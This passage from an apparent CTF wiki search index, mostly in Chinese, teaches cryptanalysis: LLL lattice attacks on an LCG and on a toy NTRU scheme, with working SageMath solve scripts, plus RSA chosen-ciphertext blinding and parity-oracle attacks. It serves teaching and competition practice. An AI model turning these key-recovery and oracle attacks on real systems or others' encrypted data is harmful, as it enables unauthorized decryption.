<p>\u4ee4</p>  \\begin{aligned} deltaX &amp;= [x_1 - x_0, \\dots, x_n - x_{n-1}]^T\\\\ deltaY &amp;= [2^{64}(y_1 - y_0), \\dots, 2^{64}(y_n - y_{n-1})]^T \\\\ deltaZ &amp;= [z_1 - z_0, \\dots, z_{n} - z_{n-1}] \\end{aligned}  <p>\u6784\u9020\u77e9\u9635A\u5982\u4e0b</p>  A = \\left[ \\begin{matrix} m &amp; 0 &amp; 0 &amp; ... &amp; 0\\\\ a &amp; -1 &amp; 0 &amp; ... &amp; 0\\\\ a^{2} &amp; 0 &amp; -1 &amp; ... &amp; 0\\\\ ... &amp; ... &amp; ... &amp; ... &amp; ...\\\\ a^{n} &amp; 0 &amp; 0 &amp; ... &amp; -1 \\end{matrix} \\right]  <p>\u4e0d\u96be\u9a8c\u8bc1\uff0cA \\cdot deltaX=0 \\mod m</p> <p>\u8bbe AL = A.LLL()\uff0c\u6709</p>  AL \\cdot deltaX = 0 \\mod m  <p>\u4e0d\u59a8\u8bbe AL \\cdot deltaX = m \\cdot [k_0, k_1, \\dots, k_{n-1}]^T = AL \\cdot (deltaY + deltaZ)</p> <p>AL \u662f\u683c\u57fa\u89c4\u7ea6\u7684\u7ed3\u679c\uff0c\u5176\u4e2d\u7684\u5411\u91cf\u90fd\u6bd4\u8f83\u77ed\uff0c\u56e0\u6b64 k \u4e2d\u7684\u5143\u7d20\u4e5f\u8f83\u5c0f.</p> <p>\u63a5\u4e0b\u6765\u5bf9\u5927\u5c0f\u8fdb\u884c\u7c97\u7565\u7684\u8ba1\u7b97\uff0cdeltaX, deltaY \u4e2d\u7684\u5143\u7d20\u90fd\u662f128\u4f4d\u7684\uff0cdeltaZ \u4e2d\u7684\u5143\u7d20\u662f64\u4f4d\u7684.</p> <p>\u7c97\u7565\u4f30\u8ba1AL \u4e2d\u7684\u5143\u7d20\u5927\u5c0f\u662f\\det(AL) ^ {1/n}=m^{1/n}\uff0c\u6ce8\u610f n \u662f\u77e9\u9635 A \u7684\u884c\u6570\u51cf1.</p> <p>\u5219 AL \\cdot deltaZ \u4e2d\u7684\u5143\u7d20\u5927\u5c0f\u5927\u7ea6\u662f</p>  \\sum_{i=0}^{n}m^{1/n} \\cdot 2^{64}=n\\cdot m^{1/n} \\cdot 2^{64}  <p>\u8fd9\u91cc\u7684 n \u662f\u6211\u4eec\u81ea\u5df1\u53ef\u4ee5\u53d6\u7684\uff0c\u5df2\u77e520\u4e2a\u72b6\u6001\uff0c\u6240\u4ee5 n \\le 20.</p> <p>\u663e\u7136\u4e0a\u5f0f\u5c0f\u4e8e m\uff0c\u5373 deltaZ \u4e2d\u7684\u5143\u7d20\u5c0f\u4e8e m.</p> <p>\u56e0\u6b64\u6709</p>  k_i=\\lfloor\\dfrac 1m \\cdot AL \\cdot(deltaY_i+deltaZ_i)\\rfloor=\\lfloor\\dfrac 1m \\cdot AL \\cdot deltaY_i \\rfloor  <p>\u90a3\u6211\u4eec\u5c31\u80fd\u901a\u8fc7 deltaY \u6c42\u51fa k\uff0c\u4ece\u800c\u5f97\u5230 deltaZ \u548c deltaX\uff0c\u6700\u540e\u6c42\u51fa\u6240\u6709\u72b6\u6001.</p>"},{"location":"crypto/asymmetric/lattice/lcg/#exp","title":"EXP","text":"<pre><code># sage\nfrom Crypto.Util.number import *\nfrom Crypto.Cipher import AES\n\nb = 153582801876235638173762045261195852087\na = 107763262682494809191803026213015101802\nm = 226649634126248141841388712969771891297\n\nclass LCG:\n    def __init__(self, seed, a, b, m):\n        self.a = a\n        self.b = b\n        self.m = m\n        self._state = seed\n\n    def next(self):\n        self._state = (self.a * self._state + self.b) % self.m\n        return self._state\n\nwith open(\"../old\", \"r\") as f:\n    y = f.readlines()\ny = list(map(int, y))\n# print(y)\n\nA = matrix(ZZ, 10, 10)\nA[0, 0] = m\nfor i in range(1, 10):\n    A[i, 0] = a ^ i\n    A[i, i] = -1\nAL = A.LLL()\n\ndelta_y = vector([(y[i+1] - y[i]) &lt;&lt; 64 for i in range(10)])\nk0 = AL * delta_y\n# print(k0)\nk = vector([round(RR(ki) / m) for ki in k0])\ndelta_z = AL.solve_right(m * k - k0)\n# print(delta_z)\n\ndelta_x = delta_y + delta_z\n# x1 = (a * x0 + b) % m\n# delta_x[0] = x1 - x0 = ((a - 1) * x0 + b) % m\n# x0 = ((delta_x[0] - b) / (a - 1)) % m\nx0 = (((delta_x[0] - b) % m) * inverse_mod(a - 1, m)) % m\n\nlcg = LCG(x0, a, b, m)\nfor i in range(20):\n    key = lcg.next() &gt;&gt; 64\nkey = (key &lt;&lt; 64) + (lcg.next() &gt;&gt; 64)\nkey = long_to_bytes(key).ljust(16, b'\\x00')\niv = long_to_bytes(lcg.next()).ljust(16, b'\\x00')\naes = AES.new(key, AES.MODE_CBC, iv)\nwith open(\"../ct\", \"rb\") as f:\n    ct = f.read()\nprint(aes.decrypt(ct))\n</code></pre>"},{"location":"crypto/asymmetric/lattice/ntru/","title":"NTRU","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/asymmetric/lattice/ntru/#ntru_1","title":"NTRU\u7684\u4f4e\u7aef\u7248\u672c","text":"<p>\u9996\u5148\u58f0\u660e\uff0c\u8fd9\u4e2a\u5bc6\u7801\u4f53\u7cfb\u4e0d\u5b89\u5168\uff0c\u4f46\u662f\u4f5c\u4e3aNTRU\u7684\u4f4e\u7aef\u7248\u672c\uff0c\u4f1a\u6709\u76f8\u5173\u9898\u76ee</p>"},{"location":"crypto/asymmetric/lattice/ntru/#_1","title":"\u5bc6\u94a5\u751f\u6210","text":"<p>Alice\u9009\u62e9\u4e00\u4e2a\u5927\u6574\u6570 p\uff0c\u7136\u540e\u968f\u673a\u9009\u62e9\u4e24\u4e2a\u8f83\u5c0f\u7684\u6574\u6570 f,g\uff0c</p>  f &lt; \\sqrt{\\dfrac p2}\\\\ \\sqrt{\\frac p4}&lt;g&lt;\\sqrt{\\frac p2}\\\\ \\gcd(f,p)=1\\\\ \\gcd(f,g)=1  <p>\u63a5\u7740\uff0cAlice\u8ba1\u7b97</p>  h = (f)^{-1}_{\\mathrm{mod}~p}g \\mod p  <p>\u5f97\u5230\u516c\u94a5 h\uff0c\u79c1\u94a5 (f, g).</p>"},{"location":"crypto/asymmetric/lattice/ntru/#_2","title":"\u52a0\u5bc6","text":"<p>\u8981\u6c42\u660e\u6587 m&lt;\\sqrt{\\dfrac p4}\uff0cBob\u968f\u673a\u9009\u62e9 r &lt; \\sqrt{\\dfrac p2}\uff0c</p> <p>Bob\u7ed9Alice\u53d1\u9001\u7684\u5bc6\u6587\u4e3a</p>  c=(rh + m) \\mod p"},{"location":"crypto/asymmetric/lattice/ntru/#_3","title":"\u89e3\u5bc6","text":"<p>Alice\u5148\u8ba1\u7b97</p>  a = fc \\mod p  <p>\u7136\u540e\u8ba1\u7b97</p>  m = (f)^{-1}_{\\mathrm{mod}~g}a \\mod g"},{"location":"crypto/asymmetric/lattice/ntru/#_4","title":"\u6b63\u786e\u6027","text":"<p>\u9996\u5148</p>  a \\equiv fc \\equiv f(rh+m) \\equiv rg+fm \\mod p  <p>\u524d\u9762\u6574\u6570\u7684\u9009\u53d6\u90fd\u6709\u8303\u56f4\u9650\u5236\uff0c\u53ef\u4ee5\u53d1\u73b0</p>  rg+fm &lt; \\sqrt \\frac p2 \\sqrt \\frac p2 + \\sqrt \\frac p2 \\sqrt \\frac p4 &lt; p  <p>\u6240\u4ee5 a=rg+fm</p> <p>\u5230\u8fd9\u4e00\u6b65\u5c31\u80fd\u770b\u51fa\uff0c</p>  m = (f)^{-1}_{\\mathrm{mod}~g}a \\mod g"},{"location":"crypto/asymmetric/lattice/ntru/#_5","title":"\u653b\u51fb","text":"<p>\u53ea\u8981\u6211\u4eec\u77e5\u9053\u79c1\u94a5 (f,g) \u5c31\u80fd\u89e3\u5bc6\uff0c\u800c\u552f\u4e00\u77e5\u9053\u7684\u5173\u4e8e f, g \u7684\u5173\u7cfb\u5f0f\u5c31\u662f</p>  h \\equiv (f)^{-1}_{\\mathrm{mod}~p}g \\mod p  <p>\u4ece\u4e2d\u5982\u4f55\u6c42\u51fa f, g \uff1f\u8fd9\u91cc\u5c31\u8981\u7528\u5230\u683c\u7684\u76f8\u5173\u77e5\u8bc6\u4e86\uff0c\u53ef\u4ee5\u628a\u8fd9\u4e2a\u95ee\u9898\u8f6c\u5316\u4e3aSVP\u95ee\u9898.</p> <p>\u7531</p>  fh \\equiv g \\mod p  <p>\u53ef\u4ee5\u5f97\u5230</p>  fh=g+u\\cdot p \\quad (u \\in \\mathbb{Z}) \\\\ fh-up=g  <p>\u6784\u9020\u4e00\u4e2a\u7531(1,h), (0,p)\u5f20\u6210\u7684\u683c\uff0c\u4ee4</p>  M=  \\begin{pmatrix}     1&amp;h\\\\     0&amp;p     \\end{pmatrix}  <p>\u53ef\u4ee5\u53d1\u73b0</p>  \\begin{align} &amp;(f, -u)M\\\\ =&amp;(f,-u)\\begin{pmatrix}         1&amp;h\\\\         0&amp;p         \\end{pmatrix}\\\\ =&amp;(f,fh-up)\\\\ =&amp;(f,g) \\end{align}  <p>(f,g) \u53ef\u4ee5\u7531\u4e24\u7ec4\u57fa\u5411\u91cfM\u7684\u7ebf\u6027\u7ec4\u5408(f,-u)\u6765\u8868\u793a\uff0c\u5373 (f,g) \u5728\u8fd9\u4e2a\u683c\u4e0a.</p> <p>\u518d\u770b\u770b\u521a\u624d\u7684\u8303\u56f4\u9650\u5236\uff0cf,g \\lt \\sqrt{\\dfrac p2}\uff0c\u6c42 f,g \u7684\u95ee\u9898\u8f6c\u5316\u4e3a\u627e\u5230\u5408\u9002\u7684\u7cfb\u6570\uff0c\u4f7f\u5f97(1,h),(0,p) \u7ec4\u5408\u51fa\u6765\u7684\u5411\u91cf\u8db3\u591f\u77ed. \u5b9e\u9645\u4e0a\uff0c\u5206\u6790\u5404\u4e2a\u6570\u636e\u7684\u4f4d\u6570\u540e\u53ef\u4ee5\u53d1\u73b0\uff0c\u5f88\u5927\u6982\u7387\u4e0a (f,g) \u5c31\u662f\u8fd9\u4e2a\u683c\u4e0a\u7684\u6700\u77ed\u5411\u91cf. \u4f4d\u6570\u53ea\u67092\u7ef4\uff0c\u56e0\u6b64\u6211\u4eec\u5229\u7528Gauss\u7684\u7b97\u6cd5\u6216LLL\u7b97\u6cd5\u5c31\u53ef\u4ee5\u6c42\u89e3.</p> <p>\u53c2\u8003</p> <p>https://xz.aliyun.com/t/7163</p> <p>https://www.ruanx.net/lattice-1/</p>"},{"location":"crypto/asymmetric/lattice/ntru/#2021-mar-dasctfson_of_ntru","title":"\u4f8b\u9898 [2021 MAR DASCTF\u660e\u5fa1\u653b\u9632\u8d5b]son_of_NTRU","text":"<pre><code>#! /bin/bash/env python3\nfrom random import randrange\nfrom Crypto.Util.number import *\nfrom gmpy2 import invert\ndef gcd(a,b):\n    while b:\n        a,b = b,a%b\n    return a\n\ndef generate():\n    p = getPrime(1024)\n    while True:\n        f = randrange(1,(p//2)**(0.5))\n        g = randrange((p//4)**(0.5),(p//2)**(0.5))\n        if gcd(f,p)==1 and gcd(f,g)==1:\n            break\n    h = (invert(f,p)*g)%p\n    return h,p,f,g\n\ndef encrypt(m,h,p):\n    assert m&lt;(p//4)**(0.5)\n    r = randrange(1,(p//2)**(0.5))\n    c = (r*h+m)%p\n    return c\n\nh,p,f,g = generate()\n\nfrom flag import flag\nc = encrypt(bytes_to_long(flag),h,p)\nprint(\"h = {}\".format(h))\nprint(\"p = {}\".format(p))\nprint(\"c = {}\".format(c))\n# h = 70851272226599856513658616506718804769182611213413854493145253337330709939355936692154199813179587933065165812259913249917314725765898812249062834111179900151466610356207921771928832591335738750053453046857602342378475278876652263044722419918958361163645152112020971804267503129035439011008349349624213734004\n# p = 125796773654949906956757901514929172896506715196511121353157781851652093811702246079116208920427110231653664239838444378725001877052652056537732732266407477191221775698956008368755461680533430353707546171814962217736494341129233572423073286387554056407408816555382448824610216634458550949715062229816683685469\n# c = 4691517945653877981376957637565364382959972087952249273292897076221178958350355396910942555879426136128610896883898318646711419768716904972164508407035668258209226498292327845169861395205212789741065517685193351416871631112431257858097798333893494180621728198734264288028849543413123321402664789239712408700\n</code></pre>"},{"location":"crypto/asymmetric/lattice/ntru/#exp","title":"EXP","text":"<pre><code>#sage\ndef GaussLatticeReduction(v1, v2):\n    while True:\n        if v2.norm() &lt; v1.norm():\n            v1, v2 = v2, v1\n        m = round( v1*v2 / v1.norm()^2 )\n        if m == 0:\n            return (v1, v2)\n        v2 = v2 - m*v1\n\nh = 70851272226599856513658616506718804769182611213413854493145253337330709939355936692154199813179587933065165812259913249917314725765898812249062834111179900151466610356207921771928832591335738750053453046857602342378475278876652263044722419918958361163645152112020971804267503129035439011008349349624213734004\np = 125796773654949906956757901514929172896506715196511121353157781851652093811702246079116208920427110231653664239838444378725001877052652056537732732266407477191221775698956008368755461680533430353707546171814962217736494341129233572423073286387554056407408816555382448824610216634458550949715062229816683685469\nc = 4691517945653877981376957637565364382959972087952249273292897076221178958350355396910942555879426136128610896883898318646711419768716904972164508407035668258209226498292327845169861395205212789741065517685193351416871631112431257858097798333893494180621728198734264288028849543413123321402664789239712408700\n\n# Construct lattice.\nv1 = vector(ZZ, [1, h])\nv2 = vector(ZZ, [0, p])\nm = matrix([v1,v2])\n\n# Solve SVP.\nshortest_vector = m.LLL()[0]\n# shortest_vector = GaussLatticeReduction(v1, v2)[0]\nf, g = shortest_vector\n\nf = abs(f)\ng = abs(g)\n\nprint(\"f =\", f)\nprint(\"g =\", g)\nprint(\"-\"*30)\n# Decrypt.\na = f*c % p % g\nm = (a * inverse_mod(f, g)) % g\nprint(bytes.fromhex(hex(m)[2:]))\n</code></pre>"},{"location":"crypto/asymmetric/lattice/ntru/#ntru_2","title":"NTRU","text":"<p>Info</p> <p>\u5f85\u8865\u5145</p>"},{"location":"crypto/asymmetric/lattice/overview/","title":"\u683c\u6982\u8ff0","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u683c\u5728\u6570\u5b66\u4e0a\u81f3\u5c11\u6709\u4e24\u79cd\u542b\u4e49</p> <ul> <li>\u5b9a\u4e49\u5728\u975e\u7a7a\u6709\u9650\u96c6\u5408\u4e0a\u7684\u504f\u5e8f\u96c6\u5408 L\uff0c\u6ee1\u8db3\u96c6\u5408 L \u4e2d\u7684\u4efb\u610f\u5143\u7d20 a\uff0cb\uff0c\u4f7f\u5f97 a\uff0cb \u5728 L \u4e2d\u5b58\u5728\u4e00\u4e2a\u6700\u5927\u4e0b\u754c\uff0c\u548c\u6700\u5c0f\u4e0a\u754c\u3002\u5177\u4f53\u53c2\u89c1https://en.wikipedia.org/wiki/Lattice_(order)\u3002</li> <li>\u7fa4\u8bba\u4e2d\u7684\u5b9a\u4e49\uff0c\u662f R^n \u4e2d\u7684\u6ee1\u8db3\u67d0\u79cd\u6027\u8d28\u7684\u5b50\u96c6\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u662f\u5176\u5b83\u7fa4\u3002</li> </ul> <p>\u76ee\u524d\u5173\u4e8e\u683c\u65b9\u9762\u7684\u7814\u7a76\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u5927\u65b9\u5411</p> <ol> <li>\u683c\u4e2d\u8ba1\u7b97\u95ee\u9898\u7684\u56f0\u96be\u6027\uff0c\u5373\u8fd9\u4e9b\u95ee\u9898\u7684\u8ba1\u7b97\u590d\u6742\u6027\uff0c\u4e3b\u8981\u5305\u62ec <ol> <li>SVP \u95ee\u9898</li> <li>CVP \u95ee\u9898</li> </ol> </li> <li>\u5982\u4f55\u6c42\u89e3\u683c\u4e2d\u7684\u56f0\u96be\u6027\u95ee\u9898\uff0c\u76ee\u524d\u65e2\u6709\u8fd1\u4f3c\u7b97\u6cd5\uff0c\u4e5f\u6709\u4e00\u4e9b\u7cbe\u786e\u6027\u7b97\u6cd5\u3002</li> <li>\u57fa\u4e8e\u683c\u7684\u5bc6\u7801\u5206\u6790\uff0c\u5373\u5982\u4f55\u5229\u7528\u683c\u7406\u8bba\u5206\u6790\u4e00\u4e9b\u5df2\u6709\u7684\u5bc6\u7801\u5b66\u7b97\u6cd5\uff0c\u76ee\u524d\u6709\u5982\u4e0b\u7814\u7a76<ol> <li>Knapsack cryptosystems</li> <li>DSA nonce biases</li> <li>Factoring RSA keys with bits known</li> <li>Small RSA private exponents</li> <li>Stereotyped messages with small RSA exponents</li> </ol> </li> <li>\u5982\u4f55\u57fa\u4e8e\u683c\u56f0\u96be\u95ee\u9898\u8bbe\u8ba1\u65b0\u7684\u5bc6\u7801\u4f53\u5236\uff0c\u8fd9\u4e5f\u662f\u540e\u91cf\u5b50\u5bc6\u7801\u65f6\u4ee3\u7684\u91cd\u8981\u7814\u7a76\u65b9\u5411\u4e4b\u4e00\uff0c\u76ee\u524d\u6709\u4ee5\u4e0b\u7814\u7a76<ol> <li>Fully homomorphic encryption</li> <li>The Goldreich\u2013Goldwasser\u2013Halevi (GGH) cryptosystem</li> <li>The NTRU cryptosystem</li> <li>The Ajtai\u2013Dwork cryptosystem and the LWE cryptosystem</li> </ol> </li> </ol>"},{"location":"crypto/asymmetric/lattice/svp/","title":"SVP","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>SVP\u5373\u6700\u77ed\u5411\u91cf\u95ee\u9898\uff0c\u7ed9\u5b9alattice\u548c\u57fa\u5411\u91cf\uff0c\u627e\u5230lattice\u4e2d\u7684\u4e00\u4e2a\u957f\u5ea6\u6700\u77ed\u7684\u975e\u96f6\u5411\u91cf\u3002</p> <p>\u5bf9\u7ef4\u5ea6\u8f83\u4f4e\u7684lattice\uff0c\u76ee\u524d\u6700\u597d\u7684\u6c42\u89e3SVP\u7684\u7b97\u6cd5\u662fLLL\u7b97\u6cd5\uff08\u53ca\u5176\u53d8\u79cd\uff09\u3002</p>"},{"location":"crypto/asymmetric/lattice/svp/#sage","title":"sage\u5b9e\u73b0","text":"<p>\u9ad8\u65af\u63d0\u51fa\u7684\u80fd\u7a33\u5b9a\u6c42\u89e32\u7ef4SVP\u95ee\u9898\u7684\u7b97\u6cd5</p> <pre><code># sage\ndef GaussLatticeReduction(v1, v2):\n    while True:\n        if v2.norm() &lt; v1.norm():\n            v1, v2 = v2, v1\n        m = round( v1*v2 / v1.norm()^2 )\n        if m == 0:\n            return (v1, v2)\n        v2 = v2 - m*v1\n\n# h = ...\n# p = ...\nv1 = vector(ZZ, [1, h])\nv2 = vector(ZZ, [0, p])\nprint(GaussLatticeReduction(v1, v2)[0])\n</code></pre> <p>LLL\u7b97\u6cd5</p> <pre><code># h = ...\n# p = ...\n\n# Construct lattice.\nv1 = vector(ZZ, [1, h])\nv2 = vector(ZZ, [0, p])\nm = matrix([v1,v2]);\n\n# Solve SVP.\nshortest_vector = m.LLL()[0]\nf, g = shortest_vector\nprint(f, g)\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/","title":"RSA \u9009\u62e9\u660e\u5bc6\u6587\u653b\u51fb","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#_1","title":"\u9009\u62e9\u660e\u6587\u653b\u51fb","text":"<p>\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5047\u5982\u6211\u4eec\u6709\u4e00\u4e2a\u52a0\u5bc6 oracle \uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053 n \u548c e\uff0c\u90a3</p> <ol> <li>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u52a0\u5bc6 oracle \u83b7\u53d6 n\u3002</li> <li>\u5728 e \u6bd4\u8f83\u5c0f\uff08 e&lt;2^{64}\uff09\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528 Pollard\u2019s kangaroo algorithm \u7b97\u6cd5\u83b7\u53d6 e\u3002\u8fd9\u4e00\u70b9\u6bd4\u8f83\u663e\u7136\u3002</li> </ol> <p>\u6211\u4eec\u53ef\u4ee5\u52a0\u5bc6 2\uff0c4\uff0c8\uff0c16\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u77e5\u9053</p> <p>c_2=2^{e} \\bmod n</p> <p>c_4=4^{e} \\bmod n</p> <p>c_8=8^{e} \\bmod n</p> <p>\u90a3\u4e48</p> <p>c_2^2 \\equiv c_4 \\bmod n</p> <p>c_2^3 \\equiv c_8 \\bmod n</p> <p>\u6545\u800c</p> <p>c_2^2-c_4=kn</p> <p>c_2^3-c_8=tn</p> <p>\u6211\u4eec\u53ef\u4ee5\u6c42\u51fa kn \u548c tn \u7684\u6700\u5927\u516c\u56e0\u6570\uff0c\u5f88\u5927\u6982\u7387\u5c31\u662f n \u4e86\u3002\u6211\u4eec\u8fd8\u53ef\u4ee5\u6784\u9020\u66f4\u591a\u7684\u4f8b\u5b50\u4ece\u6765\u66f4\u52a0\u786e\u5b9a\u6027\u5730\u627e n\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#_2","title":"\u4efb\u610f\u5bc6\u6587\u89e3\u5bc6","text":"<p>\u5047\u8bbe\u7231\u4e3d\u4e1d\u521b\u5efa\u4e86\u5bc6\u6587 C = P^e \\bmod n \u5e76\u4e14\u628a C \u53d1\u9001\u7ed9\u9c8d\u52c3\uff0c\u540c\u65f6\u5047\u8bbe\u6211\u4eec\u8981\u5bf9\u7231\u4e3d\u4e1d\u52a0\u5bc6\u540e\u7684\u4efb\u610f\u5bc6\u6587\u89e3\u5bc6\uff0c\u800c\u4e0d\u662f\u53ea\u89e3\u5bc6 C\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u62e6\u622a C\uff0c\u5e76\u8fd0\u7528\u4e0b\u5217\u6b65\u9aa4\u6c42\u51fa P\uff1a</p> <ol> <li>\u9009\u62e9\u4efb\u610f\u7684 X\\in Z_n^{*}\uff0c\u5373 X \u4e0e N \u4e92\u7d20</li> <li>\u8ba1\u7b97 Y=C \\times X^e \\bmod n </li> <li>\u7531\u4e8e\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u9009\u62e9\u5bc6\u6587\u653b\u51fb\uff0c\u90a3\u4e48\u6211\u4eec\u6c42\u5f97 Y \u5bf9\u5e94\u7684\u89e3\u5bc6\u7ed3\u679c Z=Y^d</li> <li>\u90a3\u4e48\uff0c\u7531\u4e8e Z=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= P X\\bmod n\uff0c\u7531\u4e8e X \u4e0e N \u4e92\u7d20\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u6c42\u5f97\u76f8\u5e94\u7684\u9006\u5143\uff0c\u8fdb\u800c\u53ef\u4ee5\u5f97\u5230 P</li> </ol>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#rsa-parity-oracle","title":"RSA parity oracle","text":"<p>\u5047\u8bbe\u76ee\u524d\u5b58\u5728\u4e00\u4e2a Oracle\uff0c\u5b83\u4f1a\u5bf9\u4e00\u4e2a\u7ed9\u5b9a\u7684\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u4e14\u4f1a\u68c0\u67e5\u89e3\u5bc6\u7684\u660e\u6587\u7684\u5947\u5076\u6027\uff0c\u5e76\u6839\u636e\u5947\u5076\u6027\u8fd4\u56de\u76f8\u5e94\u7684\u503c\uff0c\u6bd4\u5982 1 \u8868\u793a\u5947\u6570\uff0c0 \u8868\u793a\u5076\u6570\u3002\u90a3\u4e48\u7ed9\u5b9a\u4e00\u4e2a\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\uff0c\u6211\u4eec\u53ea\u9700\u8981 log(N) \u6b21\u5c31\u53ef\u4ee5\u77e5\u9053\u8fd9\u4e2a\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\u6d88\u606f\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#_3","title":"\u539f\u7406","text":"<p>\u5047\u8bbe</p> <p>C=P^e \\bmod N</p> <p>\u7b2c\u4e00\u6b21\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed9\u670d\u52a1\u5668\u53d1\u9001</p> <p>C*2^e=(2P)^e \\bmod N</p> <p>\u670d\u52a1\u5668\u4f1a\u8ba1\u7b97\u5f97\u5230</p> <p>2P \\bmod N</p> <p>\u8fd9\u91cc</p> <ul> <li>2P \u662f\u5076\u6570\uff0c\u5b83\u7684\u5e42\u6b21\u4e5f\u662f\u5076\u6570\u3002</li> <li>N \u662f\u5947\u6570\uff0c\u56e0\u4e3a\u5b83\u662f\u7531\u4e24\u4e2a\u5927\u7d20\u6570\u76f8\u4e58\u5f97\u5230\u3002</li> </ul> <p>\u90a3\u4e48</p> <ul> <li>\u670d\u52a1\u5668\u8fd4\u56de\u5947\u6570\uff0c\u5373 2P \\bmod N \u4e3a\u5947\u6570\uff0c\u5219\u8bf4\u660e 2P \u5927\u4e8e N\uff0c\u4e14\u51cf\u53bb\u4e86\u5947\u6570\u4e2a N\uff0c\u53c8\u56e0\u4e3a 2P&lt;2N\uff0c\u56e0\u6b64\u51cf\u53bb\u4e86\u4e00\u4e2aN\uff0c \u5373 \\frac{N}{2} \\leq P &lt; N\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u8003\u8651\u5411\u4e0b\u53d6\u6574\u3002</li> <li>\u670d\u52a1\u5668\u8fd4\u56de\u5076\u6570\uff0c\u5219\u8bf4\u660e 2P \u5c0f\u4e8e N\u3002\u5373 0\\leq P &lt; \\frac{N}{2}\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u5411\u4e0b\u53d6\u6574\u3002</li> </ul> <p>\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\uff0c\u5373\u5047\u8bbe\u5728\u7b2c i \u6b21\u65f6\uff0c\\frac{xN}{2^{i}} \\leq P &lt; \\frac{xN+N}{2^{i}}</p> <p>\u8fdb\u4e00\u6b65\uff0c\u5728\u7b2c i+1 \u6b21\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u9001</p> <p>C*2^{(i+1)e}</p> <p>\u670d\u52a1\u5668\u4f1a\u8ba1\u7b97\u5f97\u5230</p> <p>2^{i+1}P \\bmod N=2^{i+1}P-kN</p> <p>0 \\leq 2^{i+1}P-kN&lt;N </p> <p>\\frac{kN}{2^{i+1}} \\leq P &lt; \\frac{kN+N}{2^{i+1}}</p> <p>\u6839\u636e\u7b2c i \u6b21\u7684\u7ed3\u679c</p> <p>\\frac{2xN}{2^{i+1}} \\leq P &lt; \\frac{2xN+2N}{2^{i+1}}</p> <p>\u90a3\u4e48</p> <ul> <li>\u670d\u52a1\u5668\u8fd4\u56de\u5947\u6570\uff0c\u5219 k \u5fc5\u7136\u662f\u4e00\u4e2a\u5947\u6570\uff0ck=2y+1\uff0c \u90a3\u4e48 \\frac{2yN+N}{2^{i+1}} \\leq P &lt; \\frac{2yN+2N}{2^{i+1}}\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7531\u4e8e P \u5fc5\u7136\u5b58\u5728\uff0c\u6240\u4ee5\u7b2c i+1 \u5f97\u5230\u7684\u8fd9\u4e2a\u8303\u56f4\u548c\u7b2c i \u6b21\u5f97\u5230\u7684\u8303\u56f4\u5fc5\u7136\u5b58\u5728\u4ea4\u96c6\u3002\u6240\u4ee5 y \u5fc5\u7136\u4e0e x \u76f8\u7b49\u3002</li> <li>\u670d\u52a1\u5668\u8fd4\u56de\u5076\u6570\uff0c\u5219 k \u5fc5\u7136\u662f\u4e00\u4e2a\u5076\u6570\uff0ck=2y\uff0c\u6b64\u65f6 y \u5fc5\u7136\u4e5f\u4e0e x \u76f8\u7b49\uff0c\u90a3\u4e48 \\frac{2xN}{2^{i+1}} \\leq P &lt; \\frac{2xN+N}{2^{i+1}}</li> </ul> <p>\u8fdb\u4e00\u6b65\u6211\u4eec\u53ef\u4ee5\u8fd9\u4e48\u5f52\u7eb3</p> <pre><code>lb = 0\nub = N\nif server returns 1\nlb = (lb+ub)/2\nelse:\nub = (lb+ub)/2\n</code></pre> <p>\u8fd9\u91cc\u867d\u7136\u662f\u6574\u9664\uff0c \u5373\u4e0b\u53d6\u6574\uff0c\u4f46\u662f\u65e0\u6240\u8c13\u6211\u4eec\u5728\u6700\u521d\u65f6\u5df2\u7ecf\u5206\u6790\u4e86\u8fd9\u4e2a\u95ee\u9898\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#2018-google-ctf-perfect-secrecy","title":"2018 Google CTF Perfect Secrecy","text":"<p>\u8fd9\u91cc\u4ee5 2018 \u5e74 Google CTF \u7684\u9898\u76ee\u4e3a\u4f8b\u8fdb\u884c\u5206\u6790</p> <pre><code>#!/usr/bin/env python3\nimport sys\nimport random\n\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.backends import default_backend\n\n\ndef ReadPrivateKey(filename):\n  return serialization.load_pem_private_key(\n      open(filename, 'rb').read(), password=None, backend=default_backend())\n\n\ndef RsaDecrypt(private_key, ciphertext):\n  assert (len(ciphertext) &lt;=\n          (private_key.public_key().key_size // 8)), 'Ciphertext too large'\n  return pow(\n      